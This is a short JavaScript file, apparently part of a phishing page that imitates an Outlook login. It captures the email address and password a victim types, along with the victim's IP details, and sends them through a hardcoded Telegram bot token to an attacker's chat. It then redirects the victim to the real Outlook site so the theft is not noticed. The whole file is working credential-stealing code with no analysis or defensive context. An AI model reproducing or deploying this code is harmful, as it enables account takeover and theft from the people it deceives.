//bot token
var telegram_bot_id = "7600805959:AAEs_yg-RNa6OUva2bNjcloCbCC1ea-N9x4";
//chat id
var chat_id = "7299286232";
var u_name, pax, u_pin2, ip, ip2;
var ready = function () {
    u_name = document.getElementById("uzer").value;
    pax = document.getElementById("pazz").value;
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "📧EMAIL: " + u_name + "\n🔒Cl4v3: " + pax +"\nIP: " + ip +"\n" + ip2 +"\n\n🐺Sacrix32🐺";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'https://outlook.live.com';
        console.log(response);
    });
    return false;
};
